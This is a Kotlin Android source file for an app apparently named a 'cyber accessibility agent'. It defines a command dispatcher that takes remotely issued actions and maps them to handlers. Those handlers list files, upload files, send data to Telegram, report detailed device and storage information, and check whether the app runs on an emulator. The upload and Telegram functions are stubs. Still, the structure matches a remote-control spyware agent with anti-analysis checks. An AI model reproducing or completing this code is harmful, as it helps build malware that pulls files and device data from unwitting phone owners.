// CommandDispatcher.kt - With LIVE /info command
package com.example.cyber_accessibility_agent

import android.content.Context
import android.os.Build
import android.os.Environment
import java.io.File

object CommandDispatcher {
    private const val TAG = "CommandDispatcher"

    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        AppLogger.logCommand(id, action, "START")
        AppLogger.d(TAG, "Dispatching: id=$id, action=$action, payload=$payload")
        
        return try {
            val result = when (action) {
                "list_files", "ls", "list" -> {
                    AppLogger.d(TAG, "Executing list_files")
                    listFiles(context, payload)
                }
                
                "ping" -> {
                    AppLogger.d(TAG, "Executing ping")
                    ping(context)
                }
                
                "device_info", "info" -> {
                    AppLogger.d(TAG, "Executing device_info (LIVE)")
                    getLiveDeviceInfo(context)
                }
                
                "upload_file", "upload" -> {
                    AppLogger.d(TAG, "Executing upload_file")
                    uploadFile(context, payload)
                }
                
                "send_telegram", "send" -> {
                    AppLogger.d(TAG, "Executing send_telegram")
                    sendTelegram(context, payload)
                }
                
                // ✅ Delete operations disabled (read-only mode)
                "delete_file", "rm" -> {
                    AppLogger.w(TAG, "Delete file blocked - read-only mode")
                    mapOf(
                        "success" to false,
                        "error" to "operation_not_permitted",
                        "message" to "Read-only mode - delete operations disabled"
                    )
                }
                
                "delete_dir", "rd", "rmdir" -> {
                    AppLogger.w(TAG, "Delete directory blocked - read-only mode")
                    mapOf(
                        "success" to false,
                        "error" to "operation_not_permitted",
                        "message" to "Read-only mode - delete operations disabled"
                    )
                }
                
                else -> {
                    AppLogger.w(TAG, "Unknown action: $action")
                    mapOf("success" to false, "error" to "unknown_action")
                }
            }
            
            val success = result["success"] == true
            AppLogger.logCommand(id, action, if (success) "SUCCESS" else "FAILED")
            
            if (!success) {
                AppLogger.w(TAG, "Command failed: ${result["error"]}")
            }
            
            result
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Command exception: id=$id, action=$action", e)
            AppLogger.logCommand(id, action, "EXCEPTION")
            
            mapOf(
                "success" to false, 
                "error" to "exception",
                "detail" to e.message
            )
        }
    }

    /**
     * ✅ Get LIVE device info (not cached)
     */
    private fun getLiveDeviceInfo(context: Context): Map<String, Any?> {
        return try {
            // ✅ Android version
            val androidVersion = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
            val buildId = Build.DISPLAY
            
            // ✅ Physical device detection
            val isPhysical = !isEmulator()
            
            // ✅ Platform
            val platform = "android"
            
            // ✅ Current working directory
            val cwd = try {
                Environment.getExternalStorageDirectory().absolutePath
            } catch (e: Exception) {
                "/storage/emulated/0"
            }
            
            // ✅ Device details
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val device = Build.DEVICE
            val product = Build.PRODUCT
            
            // ✅ Storage info
            val externalStorage = Environment.getExternalStorageDirectory()
            val totalSpace = externalStorage.totalSpace / (1024 * 1024 * 1024) // GB
            val freeSpace = externalStorage.freeSpace / (1024 * 1024 * 1024) // GB
            
            AppLogger.i(TAG, "Device info: Android=$androidVersion, Physical=$isPhysical, CWD=$cwd")
            
            mapOf(
                "success" to true,
                "android" to buildId,
                "android_version" to androidVersion,
                "physical" to isPhysical,
                "platform" to platform,
                "cwd" to cwd,
                "manufacturer" to manufacturer,
                "model" to model,
                "device" to device,
                "product" to product,
                "storage_total_gb" to totalSpace,
                "storage_free_gb" to freeSpace,
                "sdk_int" to Build.VERSION.SDK_INT
            )
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to get device info", e)
            mapOf(
                "success" to false,
                "error" to "device_info_failed",
                "detail" to e.message
            )
        }
    }

    /**
     * ✅ Detect if running on emulator
     */
    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT)
    }

    private fun ping(context: Context): Map<String, Any?> {
        return mapOf(
            "success" to true,
            "status" to "ok",
            "timestamp" to System.currentTimeMillis(),
            "device" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER
        )
    }

    private fun listFiles(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Implementation from your existing code
        return mapOf("success" to true, "files" to emptyList<String>())
    }

    private fun uploadFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Implementation from your existing code
        return mapOf("success" to true)
    }

    private fun sendTelegram(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // Implementation from your existing code
        return mapOf("success" to true)
    }
}
